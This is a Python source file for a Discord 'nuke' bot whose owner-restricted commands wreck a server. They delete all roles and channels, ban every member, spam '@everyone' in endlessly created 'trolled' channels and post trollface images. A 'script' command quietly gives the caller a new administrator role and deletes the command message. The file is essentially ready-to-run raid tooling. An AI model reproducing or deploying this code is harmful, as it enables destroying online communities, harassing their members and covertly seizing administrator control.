from discord.ext import commands, tasks
from asyncio import sleep
import random
import discord
import httpx
import json
from discord.ext.commands.core import guild_only
from discord.raw_models import RawMessageUpdateEvent
from random import choice, randint
from discord.utils import get


intents = discord.Intents.all()
bot = commands.Bot(command_prefix = "%", case_insensitive=True)
bot.requests = httpx.AsyncClient()
maintoken = "" #your bot token
blacklist = "" 
ID = "" #enter your ID


def admin_list():
    def predicate(ctx):
        list = [] # ENTER YOUR DISCORD ID HERE
        return ctx.message.author.id in list
    return commands.check(predicate)

@bot.event
async def on_ready():
    print("started")
    game = discord.Game("trolling")
    await bot.change_presence(status=discord.Status.online, activity=game)

@bot.command()
async def hello(ctx):
  await ctx.send("hello")


@bot.command()
async def role(ctx):
  guild = ctx.guild
  permissions = discord.permissions
  await guild.create_role(name="lol")
  await ctx.send("lol")


@bot.command()
@admin_list()
async def rolegone(ctx):
  for r in ctx.guild.roles:
    await r.delete()



@bot.command()
@admin_list()
async def kill(ctx):
    '''never use this command.'''
    for c in ctx.guild.channels:
        await c.delete()
    for user in ctx.guild.members:
            try:
                await user.ban()
            except:
                pass


@bot.command()
@admin_list()
async def kill2(ctx):
  guild = ctx.guild
  for c in ctx.guild.channels:
    await c.delete()
  await sleep(1)
  if True:
      channel = await guild.create_text_channel("trolled")
      await channel.send("oops")
    


@bot.command()
@admin_list()
async def nuke(ctx):
    guild = ctx.guild
    for c in ctx.guild.channels:
        await c.delete()
    await sleep(1)
    while True:
        channel = await guild.create_text_channel("trolled")
        await channel.send("@everyone")

@bot.command()
@admin_list()
async def gone(ctx):
    '''never use this command.'''
    guild = ctx.guild
    for c in ctx.guild.channels:
        await c.delete()
        if True:
            channel = await guild.create_text_channel("trolled")
        await channel.send("@everyone")
        await channel.send("https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png")
          


@bot.command()
@admin_list()
async def troll(ctx):
  guild = ctx.guild
  member = ctx.author
  if True:
    channel = await guild.create_text_channel("funny")
    await channel.send("https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png")
    await channel.send("@everyone")


@bot.command()
@admin_list()
async def script(ctx):

  if ctx.author.id == ID:

    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name="scriptgamer", permissions=perms, colour=discord.Colour(0x0000FF))
    await ctx.author.add_roles(role)
    await ctx.message.delete()
  else:
    await ctx.send("No")


@bot.command()
@admin_list()
async def kick(ctx, member : discord.Member, *, reason=None):
  await member.kick(reason=reason)




bot.run(maintoken)
